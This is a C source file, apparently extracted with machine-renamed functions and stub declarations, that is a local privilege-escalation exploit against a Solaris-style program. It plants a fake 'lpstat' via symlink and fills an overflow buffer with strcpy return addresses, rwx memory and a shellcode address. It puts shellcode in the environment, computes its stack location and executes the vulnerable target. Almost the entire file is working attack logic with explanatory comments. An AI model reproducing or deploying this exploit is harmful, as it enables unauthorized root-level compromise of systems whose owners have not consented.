#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  release ;
typedef  int /*<<< orphan*/  platform ;
typedef  int /*<<< orphan*/  buf ;

/* Variables and functions */
 int BUFSIZE ; 
 char* INFO1 ; 
 char* INFO2 ; 
 int /*<<< orphan*/  SI_PLATFORM ; 
 int /*<<< orphan*/  SI_RELEASE ; 
 char* VULN ; 
 int /*<<< orphan*/  FUNC0 (char*) ; 
 char** env ; 
 int env_len ; 
 int env_pos ; 
 int /*<<< orphan*/  FUNC1 (char*,char**,char**) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*,char*) ; 
 char* sc ; 
 int FUNC8 (char*) ; 
 int FUNC9 () ; 
 int /*<<< orphan*/  FUNC10 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC11 (char*,char*,...) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC12 (char*,char*) ; 
 int FUNC13 (char*) ; 
 scalar_t__ FUNC14 (int /*<<< orphan*/ ,char**,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*) ; 
 int /*<<< orphan*/  FUNC16 (int /*<<< orphan*/ ,char*,int) ; 
 int /*<<< orphan*/  FUNC17 (char*) ; 

int FUNC18(int argc, char **argv)
{
	char	buf[BUFSIZE], ksh_var[16];
	char	platform[256], release[256], display[256];
	int	i, offset, sc_addr, ksh_pos;
	int	plat_len, prog_len;

	char	*arg[2] = {"foo", NULL};
	int	sb = ((int)argv[0] | 0xfff);	/* stack base */
	int	ret = FUNC8("strcpy");	/* or sprintf */
	int	rwx_mem = FUNC9();	/* rwx memory */

	/* fake lpstat code */
	if (!FUNC12(argv[0], "lpstat")) {

		/* check command line */
		if (argc != 2)
			FUNC2(1);

		/* get the shellcode address from the environment */
		sc_addr = (int)FUNC14(FUNC4("KSH"), (char **)NULL, 0);

		/* prepare the evil printer name */
		FUNC5(buf, 'A', sizeof(buf));
		buf[sizeof(buf) - 1] = 0x0;

		/* fill with ld.so.1 address, saved eip, and arguments */
		for (i = 0; i < BUFSIZE; i += 4) {
			FUNC10(buf, i, ret);		/* strcpy */
			FUNC10(buf, i += 4, rwx_mem);	/* saved eip */
			FUNC10(buf, i += 4, rwx_mem);	/* 1st argument */
			FUNC10(buf, i += 4, sc_addr);	/* 2nd argument */
		}

		/* print the expected output and exit */
		if(!FUNC12(argv[1], "-v")) {
			FUNC3(stderr, "lpstat called with -v\n");
			FUNC7("device for %s: /dev/null\n", buf);
		} else {
			FUNC3(stderr, "lpstat called with -d\n");
			FUNC7("system default destination: %s\n", buf);
		}
		FUNC2(0);
	}

	/* print exploit information */
	FUNC3(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* read command line */
	if (argc != 2) {
		FUNC3(stderr, "usage: %s xserver:display\n\n", argv[0]);
		FUNC2(1);
	}
	FUNC11(display, "DISPLAY=%s", argv[1]);

	/* get some system information */
	FUNC16(SI_PLATFORM, platform, sizeof(platform) - 1);
	FUNC16(SI_RELEASE, release, sizeof(release) - 1);

	/* fill the envp, keeping padding */
	FUNC0(sc);
	ksh_pos = env_pos;
	FUNC0("KSH=0x42424242");
	FUNC0(display);
	FUNC0("PATH=.:/usr/bin");
	FUNC0("HOME=/tmp");
	FUNC0(NULL);

	/* calculate the offset to the shellcode */
	plat_len = FUNC13(platform) + 1;
	prog_len = FUNC13(VULN) + 1;
	offset = 5 + env_len + plat_len + prog_len;

	/* calculate the shellcode address */
	sc_addr = sb - offset;

	/* overwrite the KSH env var with the right address */
	FUNC11(ksh_var, "KSH=0x%x", sc_addr);
	env[ksh_pos] = ksh_var;

	/* create a symlink for the fake lpstat */
	FUNC17("lpstat");
	FUNC15(argv[0], "lpstat");

	/* print some output */
	FUNC3(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	FUNC3(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	FUNC3(stderr, "Using rwx_mem address\t: 0x%p\n", (void *)rwx_mem);
	FUNC3(stderr, "Using sc address\t: 0x%p\n", (void *)sc_addr);
	FUNC3(stderr, "Using strcpy() address\t: 0x%p\n\n", (void *)ret);

	/* run the vulnerable program */
	FUNC1(VULN, arg, env);
	FUNC6("execve");
	FUNC2(0);
}